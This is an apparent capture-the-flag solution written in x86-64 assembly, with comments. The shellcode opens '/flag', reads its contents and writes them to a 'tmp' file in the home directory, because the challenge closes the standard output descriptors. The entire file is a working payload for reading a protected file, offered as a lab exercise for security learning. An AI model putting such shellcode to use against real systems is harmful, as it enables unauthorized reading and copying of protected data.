# In this level, I couldn't send the flag to stdout since the challenge would
# close the fds, so instead I decided to write the flag's contents in a
# temporary file inside home

.global _start
.intel_syntax noprefix
_start:
# first push the location of flag onto stack
push [rip+flag]
# mov address of string as first arg to open()
mov rdi, rsp
# the second args is O_RDONLY (=0)
xor rsi, rsi
call open

# save the returned fd
mov r10, rax

# we'll use r8 as a constant (0x37 is the length of our flag, calculated
# manually i.e. using `wc -c`
mov r8, 0x37

# save some space on stack
sub rsp, r8
# update rbp, rbp will point to our allocated space on stack (the buffer)
mov rbp, rsp
# pass fd as first arg to read
mov rdi, r10
# pass address of buffer as second arg
mov rsi, rbp
# let's try to read r8 bytes
mov rdx, r8
call read

# read returns number of bytes read
mov r10, rax

# now open the file in our home directory in the same way as the first open()
push [rip+tmp]
mov rdi, rsp
# this time, however the second arg should be O_WRONLY (=1)
mov rsi, 1
call open
# save the returned fd
mov r12, rax

# now, r12 contains opened fd, and r10 contains count
# call write
mov rdi, r12
# rbp will be pointing to the buffer which contains our flag's contents
mov rsi, rbp
# number of bytes to write
mov rdx, r10
call write

# exit cleanly
jmp exit

open:
# open(path, NULL);
push rbp
mov rbp, rsp
mov rax, 2
syscall
pop rbp
ret

read:
# read(fd, buf, count)
push rbp
mov rbp, rsp
mov rax, 0
syscall
pop rbp
ret

write:
push rbp
mov rbp, rsp
mov rax, 1
syscall
pop rbp
ret

exit:
mov rax, 60
xor rdi, rdi
syscall

tmp:
	.string "tmp"

flag:
	.string "/flag"
